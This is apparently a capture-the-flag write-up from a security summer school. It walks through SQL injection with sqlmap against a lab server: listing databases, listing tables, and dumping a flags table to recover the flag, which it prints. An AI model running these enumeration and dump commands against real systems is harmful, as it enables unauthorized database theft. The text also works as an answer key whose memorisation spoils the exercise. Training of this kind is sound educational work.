---
Name: "Demo"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Introducing SQL injection techniques against a deliberately vulnerable query."
---

# Demo
Find the databases
```bash
sqlmap -u http://141.85.224.102:8083/ --forms --dbs

available databases [5]:
[*] demo
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

Find the tables
```bash
sqlmap -u http://141.85.224.102:8083/ --forms -D demo --tables

Database: demo
[2 tables]
+-------+
| flags |
| users |
+-------+
```

Look inside the flags table
```bash
sqlmap -u http://141.85.224.102:8083/ --forms -D demo -T flags --dump

Database: demo
Table: flags
[7 entries]
+---+---------------------+
| k | v                   |
+---+---------------------+
| 1 | not_so_ez           |
| 2 | not_so_ez           |
| 3 | not_so_ez           |
| 4 | not_so_ez           |
| 5 | not_so_ez           |
| 6 | not_so_ez           |
| 7 | SSS{mAsTeR_oF_sQlI} |
+---+---------------------+

SSS{mAsTeR_oF_sQlI}
```

